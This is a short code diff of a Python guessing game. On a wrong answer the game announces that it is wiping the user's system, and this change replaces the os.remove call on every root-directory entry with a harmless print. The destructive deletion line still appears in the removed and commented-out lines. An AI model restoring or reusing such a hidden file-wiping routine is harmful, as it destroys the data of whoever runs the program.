@@ -6,4 +6,5 @@ if answer != randnum:
     print("You guessed incorrectly now removing your entire windows system.")
     sysList = os.listdir("/")
     for x in sysList:
-        os.remove("/"+x)
+            #os.remove("/"+x)
+            print("/"+x)
